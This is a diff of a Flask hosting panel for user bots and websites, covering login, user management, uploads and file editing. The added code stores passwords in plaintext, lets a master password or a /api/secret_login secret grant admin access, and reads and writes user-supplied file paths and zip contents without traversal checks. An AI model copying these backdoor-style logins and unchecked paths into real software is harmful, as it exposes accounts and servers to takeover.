+    if logo_url:
+        logo_url = logo_url + '?v=' + str(int(time.time()))
+    return render_template_string(HTML_TEMPLATE,
+                                   password=PASSWORD,
+                                   website_name=settings.get('website_name', 'YUVICODEX'),
+                                   logo_url=logo_url,
+                                   social_links=settings.get('social_links', {}),
+                                   logged_in=logged_in,
+                                   is_admin=is_admin,
+                                   username=username,
+                                   user_password=user_password)
 
-@app.route('/register', methods=['GET', 'POST'])
-def register():
-    if request.method == 'GET':
-        return render_template_string(REGISTER_TEMPLATE)
-    username = request.form.get('username', '').strip()
-    email = request.form.get('email', '').strip()
-    password = request.form.get('password', '').strip()
-    if not username or not email or not password:
-        return render_template_string(REGISTER_TEMPLATE, error='All fields required')
-    if get_user_by_username(username):
-        return render_template_string(REGISTER_TEMPLATE, error='Username taken')
-    with get_db() as conn:
+# ---------- SETTINGS API (from app.py) ----------
+@app.route('/api/settings', methods=['GET'])
+def get_settings():
+    return jsonify(load_settings())
+
+@app.route('/api/settings', methods=['POST'])
+@admin_required
+def update_settings():
+    data = request.json
+    settings = load_settings()
+    if 'website_name' in data:
+        settings['website_name'] = data['website_name']
+    if 'social_links' in data:
+        for key in ['telegram', 'youtube', 'instagram', 'tiktok']:
+            if key in data['social_links']:
+                settings['social_links'][key] = data['social_links'][key]
+    save_settings(settings)
+    return jsonify({'success': True})
+
+@app.route('/api/settings/logo', methods=['POST'])
+@admin_required
+def upload_logo():
+    if 'logo' not in request.files:
+        return jsonify({'error': 'No logo file'}), 400
+    file = request.files['logo']
+    if file.filename == '':
+        return jsonify({'error': 'Empty file'}), 400
+    ext = os.path.splitext(file.filename)[1].lower()
+    if ext not in ['.png', '.jpg', '.jpeg', '.gif', '.webp']:
+        return jsonify({'error': 'Unsupported file type'}), 400
+    filename = str(uuid.uuid4()) + ext
+    save_path = os.path.join(STATIC_LOGO_FOLDER, filename)
+    file.save(save_path)
+    settings = load_settings()
+    old_logo = settings.get('logo')
+    if old_logo and os.path.exists(os.path.join('static', old_logo)):
         try:
-            conn.execute('INSERT INTO users (username, email, password_hash, role, plan) VALUES (?, ?, ?, ?, ?)',
-                         (username, email, generate_password_hash(password), 'owner', 'free'))
-            conn.commit()
+            os.remove(os.path.join('static', old_logo))
         except:
-            return render_template_string(REGISTER_TEMPLATE, error='Email or username exists')
-    return redirect(url_for('index'))
+            pass
+    settings['logo'] = f'static/logos/{filename}'
+    save_settings(settings)
+    return jsonify({'success': True, 'logo_url': settings['logo']})
 
+@app.route('/api/settings/logo', methods=['DELETE'])
+@admin_required
+def remove_logo():
+    settings = load_settings()
+    old_logo = settings.get('logo')
+    if old_logo and os.path.exists(os.path.join('static', old_logo)):
+        try:
+            os.remove(os.path.join('static', old_logo))
+        except:
+            pass
+    settings['logo'] = None
+    save_settings(settings)
+    return jsonify({'success': True})
+
+# ---------- LOGIN / LOGOUT (from app.py) ----------
 @app.route('/login', methods=['POST'])
 def login():
-    username = request.form.get('username', '').strip()
-    password = request.form.get('password', '').strip()
-    if not username or not password:
-        return render_template_string(LOGIN_TEMPLATE, error='Please fill all fields')
-    user = get_user_by_username(username)
-    if not user or not check_password_hash(user['password_hash'], password):
-        return render_template_string(LOGIN_TEMPLATE, error='Invalid credentials')
-    if user['status'] != 'active':
-        return render_template_string(LOGIN_TEMPLATE, error='Account disabled')
-    session['user_id'] = user['id']
-    session['username'] = user['username']
-    session['role'] = user['role']
-    session['plan'] = user['plan']
-    session['session_version'] = user['session_version']
-    with get_db() as conn:
-        conn.execute('UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?', (user['id'],))
-        conn.commit()
-    return redirect(url_for('dashboard'))
+    data = request.json
+    username = data.get('username', '').strip()
+    password = data.get('password', '')
+    user = find_user(username) if username else None
 
-@app.route('/logout')
+    if user and user['password'] == password and not user.get('banned', False):
+        if is_expired(user):
+            delete_user_account(username)
+            return jsonify({'success': False, 'error': 'Account expired and deleted'}), 401
+        session['username'] = username
+        session['role'] = user['role']
+        session['session_version'] = user.get('session_version', 0)
+        return jsonify({'success': True, 'username': username, 'role': user['role']})
+
+    if password == MASTER_PASSWORD:
+        admin_user = next((u for u in users_db if u['role'] == 'admin' and not u.get('banned', False)), None)
+        if admin_user:
+            if is_expired(admin_user):
+                delete_user_account(admin_user['username'])
+                return jsonify({'success': False, 'error': 'Admin account expired and deleted'}), 401
+            session['username'] = admin_user['username']
+            session['role'] = admin_user['role']
+            session['session_version'] = admin_user.get('session_version', 0)
+            return jsonify({'success': True, 'username': admin_user['username'], 'role': admin_user['role']})
+        else:
+            return jsonify({'success': False, 'error': 'No admin user found'}), 401
+
+    return jsonify({'success': False, 'error': 'Invalid credentials'}), 401
+
+@app.route('/api/secret_login', methods=['POST'])
+def secret_login():
+    data = request.json
+    secret = data.get('secret', '')
+    if secret == SECRET_KEY:
+        admin_user = next((u for u in users_db if u['role'] == 'admin' and not u.get('banned', False)), None)
+        if admin_user:
+            if is_expired(admin_user):
+                delete_user_account(admin_user['username'])
+                return jsonify({'success': False, 'error': 'Admin account expired and deleted'}), 401
+            session['username'] = admin_user['username']
+            session['role'] = admin_user['role']
+            session['session_version'] = admin_user.get('session_version', 0)
+            return jsonify({'success': True, 'username': admin_user['username'], 'role': admin_user['role']})
+        else:
+            return jsonify({'success': False, 'error': 'No admin user found'}), 401
+    return jsonify({'success': False, 'error': 'Invalid secret'}), 401
+
+@app.route('/logout', methods=['POST'])
 def logout():
+    session.pop('username', None)
+    session.pop('role', None)
+    session.pop('session_version', None)
+    return jsonify({'success': True})
+
+# --- User Management API (from app.py) ---
+@app.route('/api/users', methods=['GET'])
+@login_required
+def get_users():
+    if session.get('role') != 'admin':
+        return jsonify({'error': 'Forbidden'}), 403
+    return jsonify(users_db)
+
+@app.route('/api/users', methods=['POST'])
+@admin_required
+def create_user():
+    global users_db
+    data = request.json
+    username = data.get('username', '').strip()
+    password = data.get('password', '')
+    role = data.get('role', 'user')
+    expiry_str = data.get('expiry', '').strip()
+    
+    if not username or not password:
+        return jsonify({'error': 'Username and password required'}), 400
+    if find_user(username):
+        return jsonify({'error': 'User exists'}), 400
+    
+    limit = 999 if role == 'admin' else 5
+    expires_at = parse_expiry(expiry_str) if expiry_str else None
+    
+    new_user = {
+        'username': username,
+        'password': password,
+        'role': role,
+        'limit': limit,
+        'banned': False,
+        'expires_at': expires_at,
+        'session_version': 0
+    }
+    users_db.append(new_user)
+    save_users(users_db)
+    users_db = load_users()
+    return jsonify({'success': True})
+
+@app.route('/api/users/<username>', methods=['PUT'])
+@admin_required
+def update_user(username):
+    username = username.strip()
+    user = find_user(username)
+    if not user:
+        return jsonify({'error': 'User not found'}), 404
+    data = request.json
+    if 'password' in data:
+        user['password'] = data['password']
+        user['session_version'] = user.get('session_version', 0) + 1
+    if 'limit' in data:
+        user['limit'] = int(data['limit'])
+    if 'banned' in data:
+        user['banned'] = data['banned']
+    if 'expiry' in data:
+        expiry_str = data['expiry'].strip()
+        user['expires_at'] = parse_expiry(expiry_str) if expiry_str else None
+    save_users(users_db)
+    return jsonify({'success': True})
+
+@app.route('/api/users/<username>', methods=['DELETE'])
+@admin_required
+def delete_user(username):
+    delete_user_account(username)
+    return jsonify({'success': True})
+
+# --- Profile Edit (owner only) ---
+@app.route('/api/profile', methods=['PUT'])
+@admin_required
+def update_profile():
+    global users_db
+    data = request.json
+    new_username = data.get('username', '').strip()
+    new_password = data.get('password', '').strip()
+    
+    old_username = session['username']
+    user = find_user(old_username)
+    if not user:
+        return jsonify({'error': 'User not found'}), 404
+    
+    if new_username and new_username != old_username:
+        if find_user(new_username):
+            return jsonify({'error': 'Username already taken'}), 400
+        user['username'] = new_username
+        for bot in bots_db.values():
+            if bot['user'] == old_username:
+                bot['user'] = new_username
+        save_bots()
+    
+    if new_password:
+        user['password'] = new_password
+    
+    user['session_version'] = user.get('session_version', 0) + 1
+    save_users(users_db)
     session.clear()
-    return redirect(url_for('index'))
+    return jsonify({'success': True, 'logout': True})
 
-# ---------- DASHBOARD ----------
-@app.route('/dashboard')
-def dashboard():
-    if 'user_id' not in session:
-        return redirect(url_for('index'))
-    user_id = session['user_id']
-    websites = get_websites_by_user(user_id, 'website')
-    bots = get_websites_by_user(user_id, 'bot')
-    base_url = os.environ.get('BASE_URL', request.host_url.rstrip('/'))
-    user = get_user_by_id(user_id)
-    return render_template_string(DASHBOARD_TEMPLATE,
-                                  user=session['username'],
-                                  websites=websites,
-                                  bots=bots,
-                                  role=session.get('role', 'owner'),
-                                  plan=session.get('plan', 'free'),
-                                  base_url=base_url,
-                                  user_obj=user)
+# ---------- Bot Management (from app.py) ----------
+@app.route('/api/bots', methods=['GET'])
+@login_required
+def list_bots():
+    username = session['username']
+    result = []
+    if is_owner(username):
+        items = bots_db.items()
+    else:
+        items = [(bid, bot) for bid, bot in bots_db.items() if bot['user'] == username]
+    
+    for bid, bot in items:
+        filepath = get_bot_absolute_path(bot)
+        token, bot_username = detect_bot_token(filepath) if os.path.exists(filepath) else (None, None)
+        bot_data = {**bot, 'id': bid, 'has_token': bool(token), 'bot_username': bot_username}
+        result.append(bot_data)
+    return jsonify(result)
 
-# ---------- UPLOAD (Unified) ----------
+@app.route('/api/bots/<bot_id>/logs', methods=['GET'])
+@login_required
+def get_bot_logs(bot_id):
+    bot = bots_db.get(bot_id)
+    if not bot:
+        return jsonify({'error': 'Bot not found'}), 404
+    username = session['username']
+    if not is_owner(username) and bot['user'] != username:
+        return jsonify({'error': 'Forbidden'}), 403
+    log_file = get_bot_log_file(bot)
+    if os.path.exists(log_file):
+        with open(log_file, 'r') as f:
+            lines = f.readlines()
+        return jsonify({'logs': ''.join(lines[-100:])})
+    return jsonify({'logs': ''})
+
+@app.route('/api/bots/<bot_id>/start', methods=['POST'])
+@login_required
+def start_bot(bot_id):
+    username = session['username']
+    bot = bots_db.get(bot_id)
+    if not bot:
+        return jsonify({'error': 'Bot not found'}), 404
+    if not is_owner(username) and bot['user'] != username:
+        return jsonify({'error': 'Forbidden'}), 403
+    success, err = start_bot_by_id(bot_id)
+    if success:
+        return jsonify({'success': True})
+    else:
+        return jsonify({'error': err}), 400
+
+@app.route('/api/bots/<bot_id>/stop', methods=['POST'])
+@login_required
+def stop_bot(bot_id):
+    username = session['username']
+    bot = bots_db.get(bot_id)
+    if not bot:
+        return jsonify({'error': 'Bot not found'}), 404
+    if not is_owner(username) and bot['user'] != username:
+        return jsonify({'error': 'Forbidden'}), 403
+    success, err = stop_bot_by_id(bot_id)
+    if success:
+        return jsonify({'success': True})
+    else:
+        return jsonify({'error': err}), 400
+
+@app.route('/api/bots/<bot_id>/restart', methods=['POST'])
+@login_required
+def restart_bot(bot_id):
+    stop_bot(bot_id)
+    return start_bot(bot_id)
+
+@app.route('/api/bots/<bot_id>', methods=['DELETE'])
+@login_required
+def delete_bot(bot_id):
+    bot = bots_db.get(bot_id)
+    if not bot:
+        return jsonify({'error': 'Bot not found'}), 404
+    username = session['username']
+    if not is_owner(username) and bot['user'] != username:
+        return jsonify({'error': 'Forbidden'}), 403
+
+    if bot['status'] == 'running':
+        proc = processes.get(bot_id)
+        if proc:
+            try:
+                if os.name != 'nt':
+                    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
+                else:
+                    proc.terminate()
+            except:
+                pass
+            proc.wait()
+            processes.pop(bot_id, None)
+
+    log_file = get_bot_log_file(bot)
+    if os.path.exists(log_file):
+        os.remove(log_file)
+
+    project_id = bot['project']
+    del bots_db[bot_id]
+    save_bots()
+
+    remaining_bots = [b for b in bots_db.values() if b['user'] == username and b['project'] == project_id]
+    if not remaining_bots:
+        project_folder = os.path.join(get_user_folder(username), project_id)
+        if os.path.exists(project_folder):
+            shutil.rmtree(project_folder, ignore_errors=True)
+
+    return jsonify({'success': True})
+
+@app.route('/api/bots/<bot_id>/download', methods=['GET'])
+@login_required
+def download_bot(bot_id):
+    bot = bots_db.get(bot_id)
+    if not bot:
+        return jsonify({'error': 'Bot not found'}), 404
+    username = session['username']
+    if not is_owner(username) and bot['user'] != username:
+        return jsonify({'error': 'Forbidden'}), 403
+
+    project_folder = os.path.join(get_user_folder(username), bot['project'])
+    zip_buffer = BytesIO()
+    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
+        if os.path.exists(project_folder):
+            for root, dirs, files_in_folder in os.walk(project_folder):
+                for fname in files_in_folder:
+                    full_path = os.path.join(root, fname)
+                    arcname = os.path.relpath(full_path, project_folder)
+                    zipf.write(full_path, arcname)
+    zip_buffer.seek(0)
+    return send_file(zip_buffer, as_attachment=True, download_name=f"{bot['project']}_project.zip")
+
+# --- Upload for Bots (existing) ---
 @app.route('/upload', methods=['POST'])
+@login_required
 def upload():
-    if 'user_id' not in session:
-        return jsonify({'success': False, 'error': 'Not logged in'}), 401
-    user_id = session['user_id']
+    username = session['username']
     if 'files[]' not in request.files:
-        return jsonify({'success': False, 'error': 'No files'}), 400
+        return jsonify({'error': 'No files'}), 400
     files = request.files.getlist('files[]')
     if not files or all(f.filename == '' for f in files):
-        return jsonify({'success': False, 'error': 'No file selected'}), 400
-    
-    upload_type = request.form.get('type', 'website')
-    user = get_user_by_id(user_id)
-    
+        return jsonify({'error': 'No file selected'}), 400
+
+    user = find_user(username)
+    if not user:
+        return jsonify({'error': 'User not found'}), 404
+    limit = user.get('limit', 5)
+    # Combined count: JSON bots + SQLite websites
+    current_bots = len([b for b in bots_db.values() if b['user'] == username])
     with get_db() as conn:
-        count = conn.execute('SELECT COUNT(*) FROM websites WHERE owner_id = ? AND type = ?', (user_id, upload_type)).fetchone()[0]
-    slug = generate_website_slug(session['username'], count)
-    if get_website_by_slug(slug):
-        count += 1
-        slug = generate_website_slug(session['username'], count)
-    
+        website_count = conn.execute('SELECT COUNT(*) FROM websites WHERE owner_username = ?', (username,)).fetchone()[0]
+    total_current = current_bots + website_count
+
+    temp_dir = tempfile.mkdtemp()
+    project_id = generate_project_id()
+    project_folder = os.path.join(get_user_folder(username), project_id)
+    os.makedirs(project_folder, exist_ok=True)
+
+    try:
+        for file in files:
+            if file.filename == '':
+                continue
+            temp_path = os.path.join(temp_dir, file.filename)
+            file.save(temp_path)
+            if file.filename.lower().endswith('.zip'):
+                with zipfile.ZipFile(temp_path, 'r') as zip_ref:
+                    zip_ref.extractall(temp_dir)
+                os.remove(temp_path)
+
+        new_bot_count = 0
+        for root, dirs, files_in_temp in os.walk(temp_dir):
+            for fname in files_in_temp:
+                if get_interpreter(fname):
+                    new_bot_count += 1
+
+        if total_current + new_bot_count > limit:
+            shutil.rmtree(project_folder, ignore_errors=True)
+            return jsonify({'error': f'Exceeds total limit. You have {total_current} items, limit {limit}.'}), 400
+
+        for root, dirs, files_in_temp in os.walk(temp_dir):
+            for fname in files_in_temp:
+                src = os.path.join(root, fname)
+                rel_path = os.path.relpath(src, temp_dir)
+                dst = os.path.join(project_folder, rel_path)
+                os.makedirs(os.path.dirname(dst), exist_ok=True)
+                shutil.move(src, dst)
+
+        created_bots = []
+        for root, dirs, files_in_folder in os.walk(project_folder):
+            for fname in files_in_folder:
+                interpreter = get_interpreter(fname)
+                if interpreter:
+                    bot_id = str(uuid.uuid4())[:8]
+                    bot = {
+                        'user': username,
+                        'project': project_id,
+                        'filename': fname,
+                        'status': 'stopped',
+                        'pid': None,
+                        'start_time': None,
+                        'interpreter': interpreter
+                    }
+                    bots_db[bot_id] = bot
+                    created_bots.append(bot_id)
+
+        save_bots()
+    finally:
+        shutil.rmtree(temp_dir, ignore_errors=True)
+
+    if created_bots:
+        for bid in created_bots:
+            start_bot_by_id(bid)
+
+    return jsonify({
+        'success': True,
+        'project_id': project_id,
+        'bots_created': len(created_bots)
+    })
+
+# --- Static file serving for bot project files ---
+@app.route('/project/<username>/<project_id>/<path:filename>')
+@login_required
+def serve_project_file(username, project_id, filename):
+    if session['username'] != username and session.get('role') != 'admin':
+        return "Forbidden", 403
+    project_folder = os.path.join(get_user_folder(username), project_id)
+    filepath = os.path.join(project_folder, filename)
+    if not os.path.exists(filepath) or not os.path.isfile(filepath):
+        return "File not found", 404
+    if not os.path.abspath(filepath).startswith(os.path.abspath(project_folder)):
+        return "Forbidden", 403
+    return send_file(filepath)
+
+# --- Bot file content (edit) ---
+@app.route('/api/bots/<bot_id>/content', methods=['GET'])
+@login_required
+def get_bot_content(bot_id):
+    bot = bots_db.get(bot_id)
+    if not bot:
+        return jsonify({'error': 'Bot not found'}), 404
+    username = session['username']
+    if not is_owner(username) and bot['user'] != username:
+        return jsonify({'error': 'Forbidden'}), 403
+    filepath = get_bot_absolute_path(bot)
+    if not os.path.exists(filepath):
+        return jsonify({'error': 'File not found'}), 404
+    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
+        content = f.read()
+    return jsonify({'content': content})
+
+@app.route('/api/bots/<bot_id>/content', methods=['PUT'])
+@login_required
+def update_bot_content(bot_id):
+    bot = bots_db.get(bot_id)
+    if not bot:
+        return jsonify({'error': 'Bot not found'}), 404
+    username = session['username']
+    if not is_owner(username) and bot['user'] != username:
+        return jsonify({'error': 'Forbidden'}), 403
+    data = request.json
+    new_content = data.get('content', '')
+    filepath = get_bot_absolute_path(bot)
+    if not os.path.exists(filepath):
+        return jsonify({'error': 'File not found'}), 404
+    with open(filepath, 'w', encoding='utf-8') as f:
+        f.write(new_content)
+    if bot['status'] == 'running':
+        stop_bot_by_id(bot_id)
+        start_bot_by_id(bot_id)
+    return jsonify({'success': True})
+
+# ---------- WEBSITE MANAGEMENT ROUTES (new) ----------
+# Upload Website (separate from bot upload)
+@app.route('/upload_website', methods=['POST'])
+@login_required
+def upload_website():
+    username = session['username']
+    if 'files[]' not in request.files:
+        return jsonify({'error': 'No files'}), 400
+    files = request.files.getlist('files[]')
+    if not files or all(f.filename == '' for f in files):
+        return jsonify({'error': 'No file selected'}), 400
+
+    user = find_user(username)
+    if not user:
+        return jsonify({'error': 'User not found'}), 404
+    limit = user.get('limit', 5)
+    # Combined count: JSON bots + SQLite websites
+    current_bots = len([b for b in bots_db.values() if b['user'] == username])
     with get_db() as conn:
-        cur = conn.execute('''INSERT INTO websites (owner_id, website_slug, website_folder, status, type, deployment_type)
-                              VALUES (?, ?, ?, ?, ?, ?)''',
-                           (user_id, slug, f"website_{0}", 'uploaded', upload_type, 'zip'))
+        website_count = conn.execute('SELECT COUNT(*) FROM websites WHERE owner_username = ?', (username,)).fetchone()[0]
+    total_current = current_bots + website_count
+
+    # Check if adding one website exceeds limit
+    if total_current + 1 > limit:
+        return jsonify({'error': f'Exceeds total limit. You have {total_current} items, limit {limit}.'}), 400
+
+    # Create website entry
+    with get_db() as conn:
+        # Determine slug
+        existing = conn.execute('SELECT COUNT(*) FROM websites WHERE owner_username = ?', (username,)).fetchone()[0]
+        slug = generate_website_slug(username, existing)
+        cur = conn.execute('''INSERT INTO websites (owner_username, website_slug, website_folder, status, type)
+                              VALUES (?, ?, ?, ?, ?)''',
+                           (username, slug, f"website_{0}", 'uploaded', 'website'))
         website_id = cur.lastrowid
         conn.commit()
     
@@ -987,54 +1508,51 @@ def upload():
         zip_file.save(os.path.join(folder, 'upload.zip'))
     
     def bg_deploy():
-        deploy_zip(website_id)
+        deploy_zip_website(website_id)
     thread = threading.Thread(target=bg_deploy)
     thread.daemon = True
     thread.start()
     
     return jsonify({'success': True, 'website_id': website_id, 'slug': slug})
 
-# ---------- API ROUTES (Websites/Bots) ----------
+# Website actions
 @app.route('/api/website/<int:website_id>/start', methods=['POST'])
+@login_required
 def api_start_website(website_id):
-    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
     w = get_website_by_id(website_id)
-    if not w or w['owner_id'] != session['user_id']: return jsonify({'error': 'Not found'}), 404
-    if w['type'] == 'bot':
-        ok, err = start_bot_by_id(website_id)
-        msg = err
-    else:
-        ok, msg = start_website_process(website_id)
-    if ok: return jsonify({'success': True, 'message': msg})
+    if not w or w['owner_username'] != session['username']:
+        return jsonify({'error': 'Not found'}), 404
+    ok, msg = start_website_process(website_id)
+    if ok:
+        return jsonify({'success': True, 'message': msg})
     return jsonify({'success': False, 'error': msg}), 500
 
 @app.route('/api/website/<int:website_id>/stop', methods=['POST'])
+@login_required
 def api_stop_website(website_id):
-    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
     w = get_website_by_id(website_id)
-    if not w or w['owner_id'] != session['user_id']: return jsonify({'error': 'Not found'}), 404
-    if w['type'] == 'bot':
-        ok, err = stop_bot_by_id(website_id)
-        msg = err
-    else:
-        ok, msg = stop_website_process(website_id)
-    if ok: return jsonify({'success': True, 'message': msg})
+    if not w or w['owner_username'] != session['username']:
+        return jsonify({'error': 'Not found'}), 404
+    ok, msg = stop_website_process(website_id)
+    if ok:
+        return jsonify({'success': True, 'message': msg})
     return jsonify({'success': False, 'error': msg}), 500
 
 @app.route('/api/website/<int:website_id>/restart', methods=['POST'])
+@login_required
 def api_restart_website(website_id):
     api_stop_website(website_id)
     time.sleep(1)
     return api_start_website(website_id)
 
 @app.route('/api/website/<int:website_id>/delete', methods=['POST'])
+@login_required
 def api_delete_website(website_id):
-    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
     w = get_website_by_id(website_id)
-    if not w or w['owner_id'] != session['user_id']: return jsonify({'error': 'Not found'}), 404
+    if not w or w['owner_username'] != session['username']:
+        return jsonify({'error': 'Not found'}), 404
     if w['status'] == 'running':
-        if w['type'] == 'bot': stop_bot_by_id(website_id)
-        else: stop_website_process(website_id)
+        stop_website_process(website_id)
     folder = os.path.join(UPLOAD_FOLDER, f"website_{website_id}")
     shutil.rmtree(folder, ignore_errors=True)
     with get_db() as conn:
@@ -1045,23 +1563,26 @@ def api_delete_website(website_id):
     return jsonify({'success': True})
 
 @app.route('/api/website/<int:website_id>/rename', methods=['POST'])
+@login_required
 def api_rename_website(website_id):
-    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
     w = get_website_by_id(website_id)
-    if not w or w['owner_id'] != session['user_id']: return jsonify({'error': 'Not found'}), 404
+    if not w or w['owner_username'] != session['username']:
+        return jsonify({'error': 'Not found'}), 404
     new_name = request.form.get('name', '').strip()
-    if not new_name: return jsonify({'error': 'Name required'}), 400
+    if not new_name:
+        return jsonify({'error': 'Name required'}), 400
     with get_db() as conn:
         conn.execute('UPDATE websites SET website_name = ? WHERE id = ?', (new_name, website_id))
         conn.commit()
     return jsonify({'success': True, 'new_name': new_name})
 
 @app.route('/api/website/<int:website_id>/logs', methods=['GET'])
-def api_get_logs(website_id):
-    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
+@login_required
+def api_get_website_logs(website_id):
     w = get_website_by_id(website_id)
-    if not w or w['owner_id'] != session['user_id']: return jsonify({'error': 'Not found'}), 404
-    log_file = os.path.join(LOG_FOLDER, f"website_{website_id}.log") if w['type'] == 'website' else os.path.join(LOG_FOLDER, f"bot_{website_id}.log")
+    if not w or w['owner_username'] != session['username']:
+        return jsonify({'error': 'Not found'}), 404
+    log_file = os.path.join(LOG_FOLDER, f"website_{website_id}.log")
     if os.path.exists(log_file):
         with open(log_file, 'r') as f:
             lines = f.readlines()
@@ -1069,49 +1590,55 @@ def api_get_logs(website_id):
     return jsonify({'logs': ''})
 
 @app.route('/api/website/<int:website_id>/content', methods=['GET'])
-def api_get_content(website_id):
-    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
+@login_required
+def api_get_website_content(website_id):
     w = get_website_by_id(website_id)
-    if not w or w['owner_id'] != session['user_id']: return jsonify({'error': 'Not found'}), 404
+    if not w or w['owner_username'] != session['username']:
+        return jsonify({'error': 'Not found'}), 404
     folder = os.path.join(UPLOAD_FOLDER, f"website_{website_id}")
     filepath = os.path.join(folder, w['startup_file'] or 'app.py')
     if not os.path.exists(filepath):
+        # try to find any file
         for f in os.listdir(folder):
-            if get_interpreter(f):
+            if os.path.isfile(os.path.join(folder, f)):
                 filepath = os.path.join(folder, f)
                 break
-    if not os.path.exists(filepath): return jsonify({'error': 'File not found'}), 404
+    if not os.path.exists(filepath):
+        return jsonify({'error': 'File not found'}), 404
     with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
         content = f.read()
     return jsonify({'content': content})
 
 @app.route('/api/website/<int:website_id>/content', methods=['PUT'])
-def api_update_content(website_id):
-    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
+@login_required
+def api_update_website_content(website_id):
     w = get_website_by_id(website_id)
-    if not w or w['owner_id'] != session['user_id']: return jsonify({'error': 'Not found'}), 404
+    if not w or w['owner_username'] != session['username']:
+        return jsonify({'error': 'Not found'}), 404
     data = request.json
     new_content = data.get('content', '')
     folder = os.path.join(UPLOAD_FOLDER, f"website_{website_id}")
     filepath = os.path.join(folder, w['startup_file'] or 'app.py')
     if not os.path.exists(filepath):
         for f in os.listdir(folder):
-            if get_interpreter(f):
+            if os.path.isfile(os.path.join(folder, f)):
                 filepath = os.path.join(folder, f)
                 break
-    if not os.path.exists(filepath): return jsonify({'error': 'File not found'}), 404
+    if not os.path.exists(filepath):
+        return jsonify({'error': 'File not found'}), 404
     with open(filepath, 'w', encoding='utf-8') as f:
         f.write(new_content)
     if w['status'] == 'running':
-        if w['type'] == 'bot': stop_bot_by_id(website_id); start_bot_by_id(website_id)
-        else: stop_website_process(website_id); start_website_process(website_id)
+        stop_website_process(website_id)
+        start_website_process(website_id)
     return jsonify({'success': True})
 
 @app.route('/api/website/<int:website_id>/download', methods=['GET'])
+@login_required
 def api_download_website(website_id):
-    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
     w = get_website_by_id(website_id)
-    if not w or w['owner_id'] != session['user_id']: return jsonify({'error': 'Not found'}), 404
+    if not w or w['owner_username'] != session['username']:
+        return jsonify({'error': 'Not found'}), 404
     folder = os.path.join(UPLOAD_FOLDER, f"website_{website_id}")
     zip_buffer = BytesIO()
     with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
@@ -1124,64 +1651,155 @@ def api_download_website(website_id):
     zip_buffer.seek(0)
     return send_file(zip_buffer, as_attachment=True, download_name=f"{w['website_slug']}_project.zip")
 
-# ---------- USER MANAGEMENT API (from app.py) ----------
-@app.route('/api/users', methods=['GET'])
-def api_get_users():
-    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
-    if session.get('role') != 'admin': return jsonify({'error': 'Forbidden'}), 403
+# Build Logs SSE
+@app.route('/deploy/<int:website_id>/logs')
+@login_required
+def deploy_logs_sse(website_id):
+    w = get_website_by_id(website_id)
+    if not w or w['owner_username'] != session['username']:
+        abort(404)
     with get_db() as conn:
-        users = conn.execute('SELECT id, username, email, role, plan, status, created_at, expires_at FROM users').fetchall()
-    return jsonify([dict(u) for u in users])
+        dep = conn.execute('SELECT * FROM deployments WHERE website_id = ? ORDER BY id DESC LIMIT 1', (website_id,)).fetchone()
+    if not dep:
+        return "No deployment", 404
+    log_file = dep['log_file'] or os.path.join(LOG_FOLDER, f"deploy_{dep['id']}.log")
+    def generate():
+        if os.path.exists(log_file):
+            with open(log_file, 'r') as f:
+                for line in f:
+                    yield f"data: {line.strip()}\n\n"
+        last_size = os.path.getsize(log_file) if os.path.exists(log_file) else 0
+        while True:
+            time.sleep(0.5)
+            if os.path.exists(log_file):
+                cur = os.path.getsize(log_file)
+                if cur > last_size:
+                    with open(log_file, 'r') as f:
+                        f.seek(last_size)
+                        for line in f:
+                            yield f"data: {line.strip()}\n\n"
+                    last_size = cur
+            with get_db() as conn:
+                status = conn.execute('SELECT status FROM deployments WHERE id = ?', (dep['id'],)).fetchone()
+            if status and status['status'] in ('success', 'failed'):
+                yield f"data: [SYSTEM] Completed with status: {status['status']}\n\n"
+                break
+    return Response(stream_with_context(generate()), mimetype='text/event-stream')
 
-@app.route('/api/users', methods=['POST'])
-def api_create_user():
-    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
-    if session.get('role') != 'admin': return jsonify({'error': 'Forbidden'}), 403
+# Website File Manager
+@app.route('/website/<int:website_id>/files')
+@login_required
+def website_files(website_id):
+    w = get_website_by_id(website_id)
+    if not w or w['owner_username'] != session['username']:
+        abort(404)
+    folder = os.path.join(UPLOAD_FOLDER, f"website_{website_id}")
+    if not os.path.exists(folder):
+        abort(404)
+    items = []
+    for root, dirs, files_list in os.walk(folder):
+        rel = os.path.relpath(root, folder)
+        if rel == '.': rel = ''
+        for f in files_list:
+            full = os.path.join(root, f)
+            items.append({'name': f, 'path': os.path.join(rel, f).replace('\\', '/'), 'is_dir': False, 'size': os.path.getsize(full)})
+        for d in dirs:
+            items.append({'name': d, 'path': os.path.join(rel, d).replace('\\', '/'), 'is_dir': True})
+    return render_template_string(FILES_TEMPLATE, website=w, items=items)
+
+@app.route('/website/<int:website_id>/edit', methods=['GET', 'POST'])
+@login_required
+def website_edit_file(website_id):
+    w = get_website_by_id(website_id)
+    if not w or w['owner_username'] != session['username']:
+        abort(404)
+    file_path = request.args.get('path', '').strip()
+    if not file_path:
+        return "No path", 400
+    full = os.path.join(UPLOAD_FOLDER, f"website_{website_id}", file_path)
+    if not os.path.exists(full) or not os.path.isfile(full):
+        abort(404)
+    if request.method == 'GET':
+        with open(full, 'r', encoding='utf-8', errors='ignore') as f:
+            content = f.read()
+        return render_template_string(EDIT_TEMPLATE, website=w, file_path=file_path, content=content)
+    else:
+        with open(full, 'w', encoding='utf-8') as f:
+            f.write(request.form.get('content', ''))
+        return redirect(url_for('website_files', website_id=website_id))
+
+@app.route('/website/<int:website_id>/file/upload', methods=['POST'])
+@login_required
+def website_upload_file(website_id):
+    w = get_website_by_id(website_id)
+    if not w or w['owner_username'] != session['username']:
+        return jsonify({'error': 'Unauthorized'}), 401
+    if 'file' not in request.files:
